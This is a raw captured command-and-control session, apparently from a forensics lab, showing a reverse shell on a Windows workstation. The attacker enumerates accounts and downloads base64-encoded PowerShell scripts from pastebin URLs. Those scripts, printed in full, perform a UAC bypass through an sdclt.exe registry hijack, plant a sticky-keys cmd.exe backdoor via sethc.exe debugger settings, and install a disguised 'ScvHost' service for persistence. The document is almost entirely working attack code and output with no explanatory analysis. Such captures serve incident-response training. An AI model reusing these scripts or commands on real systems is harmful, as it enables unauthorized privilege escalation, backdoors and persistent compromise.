## C2 Server TCP Follow

```text
P....H........AQAPRQVH1.eH.R`H.R.H.R H.rPH..JJM1.H1..<a|., A..
A....RAQH.R .B<H........H..tgH..P.H.D.@ I...VH..A.4.H..M1.H1..A..
A..8.u.L.L$.E9.u.XD.@$I..fA..HD.@.I..A...H..AXAX^YZAXAYAZH.. AR..XAYZH...W...]I.cmd.....APAPH..WWWM1.j
YAP..f.D$T..H.D$...hH..VPAPAPAPI..API..M..L..A.y.?...H1.H....A....`......VA.......H..(<.|
...u..G.roj.YA....Microsoft Windows [Version 10.0.17763.1]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Alan\Downloads>cd %TEMP%
cd %TEMP%

C:\Users\Alan\AppData\Local\Temp>whoami /all
whoami /all

USER INFORMATION
----------------

User Name        SID                                           
================ ==============================================
workstation\alan S-1-5-21-2423855938-2581495550-2013206183-1000


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                        
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only                          
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only                          
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled


C:\Users\Alan\AppData\Local\Temp>quser
quser
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>alan                  console             1  Active      none   8/17/2019 5:37 AM

C:\Users\Alan\AppData\Local\Temp>user
user
'user' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Alan\AppData\Local\Temp>net user
net user

User accounts for \\WORKSTATION

-------------------------------------------------------------------------------
Administrator            Alan                     DefaultAccount           
Guest                    WDAGUtilityAccount       
The command completed successfully.


C:\Users\Alan\AppData\Local\Temp>net user add Craig /add
net user add Craig /add
System error 5 has occurred.

Access is denied.


C:\Users\Alan\AppData\Local\Temp>$uri = "http://pastebin.com/raw/VeLUwUuq"
$uri = "http://pastebin.com/raw/VeLUwUuq"
'$uri' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Alan\AppData\Local\Temp>PowerShell.exe
PowerShell.exe
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Alan\AppData\Local\Temp> $uri = "http://pastebin.com/raw/VeLUwUuq"
$uri = "http://pastebin.com/raw/VeLUwUuq"
PS C:\Users\Alan\AppData\Local\Temp> $data = [System.Convert]::FromBase64String((Invoke-WebRequest -Uri "$uri" -UseBasicParsing).content)
$data = [System.Convert]::FromBase64String((Invoke-WebRequest -Uri "$uri" -UseBasicParsing).content)
PS C:\Users\Alan\AppData\Local\Temp> [System.IO.File]::WriteAllBytes("$env:TEMP\WriteRemoteEncoded.ps1", $data)
[System.IO.File]::WriteAllBytes("$env:TEMP\WriteRemoteEncoded.ps1", $data)
PS C:\Users\Alan\AppData\Local\Temp> get-content WriteRemoteEncoded.ps1
get-content WriteRemoteEncoded.ps1
Param(
    [Parameter(Mandatory=$true,
    ValueFromPipeLine=$false)]
    [String[]]
    $Uri,

    [Parameter(Mandatory=$true,
    ValueFromPipeLine=$false)]
    [String[]]
    $FileName
)

Write-Host $Uri

$path = "$env:TEMP\$FileName"
if (Test-Path -Path $path) {
    Write-Host "[*] File already exist at $ScriptPath"
    return -1
}

$data = [System.Convert]::FromBase64String((Invoke-WebRequest -Uri "$Uri" -UseBasicParsing).content)
[System.IO.File]::WriteAllBytes($path, $data)
PS C:\Users\Alan\AppData\Local\Temp> .\WriteRemoteEncoded.ps1 -Uri "http://pastebin.com/raw/SZgzvpaU" -FileName ElevateExecute.ps1
.\WriteRemoteEncoded.ps1 -Uri "http://pastebin.com/raw/SZgzvpaU" -FileName ElevateExecute.ps1
http://pastebin.com/raw/SZgzvpaU
PS C:\Users\Alan\AppData\Local\Temp> get-content ElevateExecute.ps1
get-content ElevateExecute.ps1
Param(
    [Parameter(Mandatory=$true,
    ValueFromPipeLine=$false)]
    [String[]]
    $ScriptPath
)

if (!(Test-Path -Path $ScriptPath)) {
    Write-Host "[*] File does not exist at $ScriptPath"
    return -1
}

$path = "HKCU:\Software\Classes\Folder\shell\open\command"
if (!(Test-Path -Path $path)) {
    New-Item -Path $path -Force
}

New-ItemProperty -Path $path -Name "(Default)" -PropertyType String -Value "PowerShell.exe -File $ScriptPath" -Force
New-ItemProperty -Path $path -Name "DelegateExecute" -Force

Start-Process -FilePath "$env:windir\system32\sdclt.exe"

Start-Sleep -Seconds 3

Clear-ItemProperty -Path $path -Name "(Default)"
Remove-ItemProperty -Path $path -Name "DelegateExecute"
PS C:\Users\Alan\AppData\Local\Temp> .\WriteRemoteEncoded.ps1 -Uri "http://pastebin.com/raw/0FmG9g40" -FileName Sticky.ps1
.\WriteRemoteEncoded.ps1 -Uri "http://pastebin.com/raw/0FmG9g40" -FileName Sticky.ps1
http://pastebin.com/raw/0FmG9g40
PS C:\Users\Alan\AppData\Local\Temp> get-content Sticky.ps1
get-content Sticky.ps1
$path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
if (!(Test-Path -Path $path)) {
    New-Item -Path $path -Force
}

New-ItemProperty -Path $path -Name "Debugger" -PropertyType String -Value "C:\windows\system32\cmd.exe" -Force
PS C:\Users\Alan\AppData\Local\Temp> .\WriteRemoteEncoded.ps1 -Uri "http://pastebin.com/raw/4uZ7zKg9" -FileName Service.ps1
.\WriteRemoteEncoded.ps1 -Uri "http://pastebin.com/raw/4uZ7zKg9" -FileName Service.ps1
http://pastebin.com/raw/4uZ7zKg9
PS C:\Users\Alan\AppData\Local\Temp> get-content Service.ps1
get-content Service.ps1
$path = "$env:TEMP\scvhost.exe"

if (Test-Path -Path $path) {
    New-Service -Name "ScvHost" -BinaryPathName $path -DisplayName "ScvHost" -Description "Shared Service Host" -StartupType Automatic
    Start-Service -Name "ScvHost"
}
PS C:\Users\Alan\AppData\Local\Temp> .\WriteRemoteEncoded.ps1 -Uri "http://pastebin.com/raw/7vFz8K3E" -FileName scvhost.exe
.\WriteRemoteEncoded.ps1 -Uri "http://pastebin.com/raw/7vFz8K3E" -FileName scvhost.exe
http://pastebin.com/raw/7vFz8K3E
PS C:\Users\Alan\AppData\Local\Temp> get-filehash -Algorithm SHA1 -Path scvhost.exe
get-filehash -Algorithm SHA1 -Path scvhost.exe

Algorithm       Hash                                                                   Path                            
---------       ----                                                                   ----                            
SHA1            8DA3C5CB0CD92F44AFA0D0DA820B0323B64943F2                               C:\Users\Alan\AppData\Local\T...


PS C:\Users\Alan\AppData\Local\Temp> .\ElevateExecute.ps1 -ScriptPath "C:\Users\Alan\AppData\Local\Temp\Sticky.ps1"
.\ElevateExecute.ps1 -ScriptPath "C:\Users\Alan\AppData\Local\Temp\Sticky.ps1"


    Hive: HKEY_CURRENT_USER\Software\Classes\Folder\shell\open


Name                           Property                                                                                
----                           --------                                                                                
command                                                                                                                

(Default)    : PowerShell.exe -File C:\Users\Alan\AppData\Local\Temp\Sticky.ps1
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\Folder\shell\open\command
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\Folder\shell\open
PSChildName  : command
PSDrive      : HKCU
PSProvider   : Microsoft.PowerShell.Core\Registry


DelegateExecute : 
PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\Folder\shell\open\command
PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\Folder\shell\open
PSChildName     : command
PSDrive         : HKCU
PSProvider      : Microsoft.PowerShell.Core\Registry



PS C:\Users\Alan\AppData\Local\Temp> .\ElevateExecute.ps1 -ScriptPath "C:\Users\Alan\AppData\Local\Temp\Service.ps1"
.\ElevateExecute.ps1 -ScriptPath "C:\Users\Alan\AppData\Local\Temp\Service.ps1"


(Default)    : PowerShell.exe -File C:\Users\Alan\AppData\Local\Temp\Service.ps1
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\Folder\shell\open\command
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\Folder\shell\open
PSChildName  : command
PSDrive      : HKCU
PSProvider   : Microsoft.PowerShell.Core\Registry

DelegateExecute : 
PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\Folder\shell\open\command
PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\Folder\shell\open
PSChildName     : command
PSDrive         : HKCU
PSProvider      : Microsoft.PowerShell.Core\Registry



PS C:\Users\Alan\AppData\Local\Temp> exit
exit

C:\Users\Alan\AppData\Local\Temp>exit
exit
```
